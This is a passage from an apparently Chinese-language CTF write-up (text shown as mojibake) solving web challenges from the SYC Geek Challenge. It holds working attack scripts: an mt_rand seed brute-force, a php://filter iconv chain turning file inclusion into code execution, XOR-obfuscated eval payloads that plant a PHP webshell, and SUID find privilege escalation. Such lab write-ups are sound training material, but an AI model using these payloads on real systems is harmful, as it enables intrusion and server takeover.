class="line"><span class="keyword">for</span>(<span class="variable">$k</span>=-<span class="number">20</span>;<span class="variable">$k</span>&lt;<span class="number">20</span>;<span class="variable">$k</span>++) &#123;</span><br><span class="line">    <span class="variable">$seed</span> = <span class="variable">$x</span>+<span class="variable">$k</span>;</span><br><span class="line">    <span class="title function_ invoke__">php_mt_seed</span>(<span class="variable">$seed</span>);</span><br><span class="line">    <span class="variable">$characters</span> = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="variable">$newFileName</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">10</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$newFileName</span> .= <span class="variable">$characters</span>[<span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$characters</span>) - <span class="number">1</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$newFileName</span>.<span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¾—åˆ°çš„æ–‡ä»¶åï¼Œçˆ†ç ´å…¶å­˜åœ¨æ€§ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">rand = <span class="string">&#x27;nMa3orDC2e|sso43vzOmv|3cLxYQjVCU|bfcsVjUjUc|DGUxICjb62|4agL09NVrj|vCY0Ii09gS|KEC5rjXegm|14Bl45OsHh|zgbN7myZbJ|Q67hx4uRVf|E4SQRpukkv|31A7kBmcpB|3J5Pj4Yfeb|zXfWAa86o5|5KMdsa0Uo0|btCM1eO8wo|maZNliuB1R|Y836Rhmpca|YreAYs4dbp|uK4nhxkdkw|4utkLM9gE7|TYekFoXTXJ|JSP6Hx0vyI|kzjZoBiv9R|EtQZUROvnh|HcTSaxtIXF|GmQhLWWoQ7|3PefcQupE7|Ctbc67MqB4|U55i5C09vA|ZqeKQ6yJSV|ufP5AUtnC6|yiYrEYIAgg|mHwm6SFE0K|q8PwOK5E2U|kBwsskBu0h|AlYCggPR8d|25Lmp0TH9E|2VDW4pida7|&#x27;</span>.<span class="title function_ invoke__">split</span>(<span class="string">&#x27;|&#x27;</span>)[:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;https://s5bwqhfkrgtcnancf0t3vxkgq.node.game.sycsec.com/upload/&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i in <span class="title function_ invoke__">range</span>(<span class="title function_ invoke__">len</span>(rand)):</span><br><span class="line">    u = url + rand[i] + <span class="string">&#x27;.php&#x27;</span></span><br><span class="line">    r=requests.<span class="title function_ invoke__">get</span>(u)</span><br><span class="line">    <span class="keyword">if</span> r.status_code == <span class="number">200</span>:</span><br><span class="line">        <span class="keyword">print</span>(u)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>è®¿é—®å³å¯å¾—flagã€‚</p><p>â€‹    </p><h3 id="ezrfi"><a href="#ezrfi" class="headerlink" title="ezrfi"></a>ezrfi</h3><blockquote><p>äº²çˆ±çš„Syclover,ä½ èƒ½æ‰¾åˆ°flagå—????</p></blockquote><p>åªèƒ½è¯»pyæ–‡ä»¶ï¼Œè¯•å‡º <code>?file=/var/hint</code></p><p><code>secret=&quot;w5YubyBvd08gMHcwIG92MCDDlndvIE8ubyAwLjAgMC5vIMOWdjAgMHbDliBPdjAgT3fDliBvLk8gw5Z2TyAwXzAgMF9PIG8uTyAwdjAgw5ZfbyBPd28gw5Z2TyDDli5PIMOWXzAgTy5PIMOWXzAgMHbDliAwLjAgw5Z2w5Ygw5Z3MCBPdsOWIMOWdjAgT1/DliDDlnZPIMOWLk8gw5Z3MCBvd8OWIMOWLm8gTy5vIMOWXzAgMHbDliDDlndvIE93w5YgTy5vIE93TyBvX28gw5YuTyBvLm8gb3dPIMOWXzAgb3dPIMOWXzAgMHZvIG8uTyBPd8OWIE92byAwLsOWIMOWdjAgTy7DliAwLjAgMHfDliBvLsOWIG93byBvdzAgMHZvIMOWLm8gb3dPIG9fMCDDli5PIG9fbyBPd8OWIE8ubyBvdzAgw5ZfbyBvd28gw5YuMCDDlnZPIG9fTyBPLsOWIE92MCBPdzAgby7DliAwdjAgT3YwIE9fTyBvLk8gT3bDliDDlnYwIMOWXzAgw5Z3byBvd08gT19vIE93w5Ygby5PIMOWdk8gby4wIDBfMCDDll9vIG93TyBPXzAgMC7DliDDli5vIE8uTyBPdzAgT19vIMOWdjAgb3cwIMOWdjAgT18wIMOWdm8gw5Z2w5Ygw5ZfbyAwX8OWIMOWdm8gw5Z2w5YgMHcwIE92w5Ygw5YubyDDli4wIMOWLm8gb3ZvIMOWLjAgw5YuMCAwd28gb3dPIG8uTyAwd8OWIDB2MCBvd8OWIMOWdzAgw5YubyAwdzAgT1/DliBvX08gw5Z2byAg&quot;</code></p><p>base64è§£å¯†å¾—ï¼š</p><p><code>Ã–.o owO 0w0 ov0 Ã–wo O.o 0.0 0.o Ã–v0 0vÃ– Ov0 OwÃ– o.O Ã–vO 0_0 0_O o.O 0v0 Ã–_o Owo Ã–vO Ã–.O Ã–_0 O.O Ã–_0 0vÃ– 0.0 Ã–vÃ– Ã–w0 OvÃ– Ã–v0 O_Ã– Ã–vO Ã–.O Ã–w0 owÃ– Ã–.o O.o Ã–_0 0vÃ– Ã–wo OwÃ– O.o OwO o_o Ã–.O o.o owO Ã–_0 owO Ã–_0 0vo o.O OwÃ– Ovo 0.Ã– Ã–v0 O.Ã– 0.0 0wÃ– o.Ã– owo ow0 0vo Ã–.o owO o_0 Ã–.O o_o OwÃ– O.o ow0 Ã–_o owo Ã–.0 Ã–vO o_O O.Ã– Ov0 Ow0 o.Ã– 0v0 Ov0 O_O o.O OvÃ– Ã–v0 Ã–_0 Ã–wo owO O_o OwÃ– o.O Ã–vO o.0 0_0 Ã–_o owO O_0 0.Ã– Ã–.o O.O Ow0 O_o Ã–v0 ow0 Ã–v0 O_0 Ã–vo Ã–vÃ– Ã–_o 0_Ã– Ã–vo Ã–vÃ– 0w0 OvÃ– Ã–.o Ã–.0 Ã–.o ovo Ã–.0 Ã–.0 0wo owO o.O 0wÃ– 0v0 owÃ– Ã–w0 Ã–.o 0w0 O_Ã– o_O Ã–vo</code></p><p>å°Šå˜Ÿå‡å˜Ÿè§£ç ï¼š</p><p><code>Shy0JhFpsi+njV0IfFfzS44KIcwPFg312qo6gfdk0+DzcoMdSgVs15cERxpqnPJh4Y3b3i/mcbkPlHGTIA6/A8CQU8UX6j9w5HKy</code></p><p>æ ¹æ®æç¤ºRC4è§£ç ï¼Œkey=Sycloverï¼Œå¾—ï¼š</p><p><code>æ–‡ä»¶åŒ…å«é€»è¾‘æ˜¯include($file.&quot;.py&quot;),ä½ èƒ½æ‰¾åˆ°flagæ–‡ä»¶ä½ç½®å—??</code></p><p>å‚è€ƒï¼š <a href="https://k1te.cn/2022/01/10/LFIå­¦ä¹ /">LFI æ–°å§¿åŠ¿å­¦ä¹ </a>ï¼Œä½¿ç”¨æ–‡ä»¶åŒ…å«RCEï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://bhhtut26mxsa9f29ft8jg5y5p.node.game.sycsec.com/index.php&quot;</span></span><br><span class="line">file_to_use = <span class="string">&quot;/var/hint&quot;</span></span><br><span class="line">command = <span class="string">&quot;cat /ffffffllllag&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#&lt;?=`$_GET[0]`;;?&gt;</span></span><br><span class="line">base64_payload = <span class="string">&quot;PD89YCRfR0VUWzBdYDs7Pz4&quot;</span></span><br><span class="line"></span><br><span class="line">conversions = &#123;</span><br><span class="line">    <span class="string">&#x27;R&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.MAC.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;B&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;C&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;f&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L3.T.61&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L7.NAPLPS&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;U&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;P&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.857.SHIFTJISX0213&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;V&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.851.BIG5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Y&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;W&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.851.UTF8|convert.iconv.L7.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;D&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># generate some garbage base64</span></span><br><span class="line">filters = <span class="string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span></span><br><span class="line">filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line"><span class="comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span></span><br><span class="line">filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> base64_payload[::-<span class="number">1</span>]:</span><br><span class="line">        filters += conversions[c] + <span class="string">&quot;|&quot;</span></span><br><span class="line">        <span class="comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-decode|&quot;</span></span><br><span class="line">        filters += <span class="string">&quot;convert.base64-encode|&quot;</span></span><br><span class="line">        <span class="comment"># get rid of equal signs</span></span><br><span class="line">        filters += <span class="string">&quot;convert.iconv.UTF8.UTF7|&quot;</span></span><br><span class="line"></span><br><span class="line">filters += <span class="string">&quot;convert.base64-decode&quot;</span></span><br><span class="line"></span><br><span class="line">final_payload = <span class="string">f&quot;php://filter/<span class="subst">&#123;filters&#125;</span>/resource=<span class="subst">&#123;file_to_use&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">r = requests.get(url, params=&#123;</span><br><span class="line">    <span class="string">&quot;0&quot;</span>: command,</span><br><span class="line">    <span class="string">&quot;file&quot;</span>: final_payload</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="comment"># SYC&#123;The PhpFFffilter 0n File-include vulnerabilities is s0 Amazing!!#@##&#125;</span></span><br></pre></td></tr></table></figure><p>â€‹    </p><h3 id="EzRce"><a href="#EzRce" class="headerlink" title="EzRce"></a>EzRce</h3><blockquote><p>can you rce me??? flagä¸­ç©ºæ ¼è¯·ç”¨ä¸‹åˆ’çº¿æ›¿ä»£</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;waf.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$data</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;data&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$data</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;no!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></blockquote><p>ç›²è¯•wafï¼Œä¸ºæ— å­—æ¯æ•°å­—RCEï¼Œå¼‚æˆ–å¯ç”¨ï¼Œå°†æ¯ä¸ªå­—ç¬¦å¼‚æˆ– <code>%A0</code> å¾—åˆ°ä¸å¯è§å­—ç¬¦ã€‚</p><p><code>phpinfo();</code>ï¼š</p><p><code>?data=(%A0%A0%A0%A0%A0%A0%A0^%D0%C8%D0%C9%CE%C6%CF)();</code></p><p>çœ‹åˆ°disable_functionç¦ç”¨äº†ï¼š</p><p><code>exec,system,fwrite,passthru,popen,shell_exec,error_log,fputs,file_get_contents,assert,call_user_func,call_user_func_array,array_map,array_filter,array_reduce,get_defined_vars,getallheaders</code></p><p>è¯»waf - <code>readgzfile(&#39;waf.php&#39;);</code>ï¼š</p><p><code>?data=(%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0^%D2%C5%C1%C4%C7%DA%C6%C9%CC%C5)(%A0%A0%A0%A0%A0%A0%A0^%D7%C1%C6%8E%D0%C8%D0);</code></p><p>waf.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[b-df-km-uw-z0-9\+\~\&#123;\&#125;]+/i&#x27;</span>,<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">return</span> False;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> True;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†™é©¬ - <code>file_put_contents(&#39;2.php&#39;,&#39;&lt;?php eval($_POST[1]);&#39;);</code>ï¼š</p><p><code>?data=(%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0^%C6%C9%CC%C5%FF%D0%D5%D4%FF%C3%CF%CE%D4%C5%CE%D4%D3)((%A0%A0%A0%A0%A0^%92%8E%D0%C8%D0),(%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0%A0^%9C%9F%D0%C8%D0%80%C5%D6%C1%CC%88%84%FF%F0%EF%F3%F4%FB%91%FD%89%9B));</code></p><p>èšå‰‘è¿æ¥ï¼Œ<code>find / -perm -u=s -type f 2&gt;/dev/null</code> å‘ç° <code>/usr/bin/find</code> æœ‰ SUIDæƒé™ï¼Œ</p><p>findææƒï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">touch abcd</span><br><span class="line">find abcd -exec cat /flag \;</span><br></pre></td></tr></table></figure><p>å¾—flagï¼š<code>SYC&#123;ThE_RCe is S0 Eas1ly_DD!&#125;</code></p><p>â€‹    </p><h3 id="ezpython"><a href="#ezpython" class="headerlink" title="ezpython"></a>ezpython</h3><blockquote><p>can you pollute me?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> waf <span class="keyword">import</span> waf</span><br><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask,render_template,request,redirect,url_for,session,render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key=<span class="string">&#x27;jjjjggggggreekchallenge202333333&#x27;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">User</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username=<span class="string">&quot;&quot;</span></span><br><span class="line">        self.password=<span class="string">&quot;&quot;</span></span><br><span class="line">        self.isvip=<span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">hhh</span>(<span class="title class_ inherited__">User</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username=<span class="string">&quot;&quot;</span></span><br><span class="line">        self.password=<span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">registered_users=[]</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():  <span class="comment"># put application&#x27;s code here</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;welcome.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/play&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play</span>():</span><br><span class="line">    username=session.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> username:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,name=username)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        username=request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">        password=request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        user = <span class="built_in">next</span>((user <span class="keyword">for</span> user <span class="keyword">in</span> registered_users <span class="keyword">if</span> user.username == username <span class="keyword">and</span> user.password == password), <span class="literal">None</span>)</span><br><span class="line">        <span class="keyword">if</span> user:</span><br><span class="line">            session[<span class="string">&#x27;username&#x27;</span>] = user.username</span><br><span class="line">            session[<span class="string">&#x27;password&#x27;</span>]=user.password</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;play&#x27;</span>))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Invalid login&quot;</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;play&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> waf(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;fuck payload!Hacker!!!&quot;</span></span><br><span class="line">            data=json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;è¿ç”¨æˆ·åå¯†ç éƒ½æ²¡æœ‰ä½ æ³¨å†Œå•¥å‘¢&quot;</span></span><br><span class="line">            user=hhh()</span><br><span class="line">            merge(data,user)</span><br><span class="line">            registered_users.append(user)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;æ³°é…·è¾£,æ²¡æœ‰æ³¨å†ŒæˆåŠŸæ&quot;</span></span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/flag&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    user = <span class="built_in">next</span>((user <span class="keyword">for</span> user <span class="keyword">in</span> registered_users <span class="keyword">if</span> user.username ==session[<span class="string">&#x27;username&#x27;</span>]  <span class="keyword">and</span> user.password == session[<span class="string">&#x27;password&#x27;</span>]), <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> user:</span><br><span class="line">        <span class="keyword">if</span> user.isvip:</span><br><span class="line">            data=request.args.get(<span class="string">&#x27;num&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> data:</span><br><span class="line">                <span class="keyword">if</span> <span class="string">&#x27;0&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">and</span> data != <span class="string">&quot;123456789&quot;</span> <span class="keyword">and</span> <span class="built_in">int</span>(data) == <span class="number">123456789</span> <span class="keyword">and</span> <span class="built_in">len</span>(data) &lt;=<span class="number">10</span>:</span><br><span class="line">                        flag = os.environ.get(<span 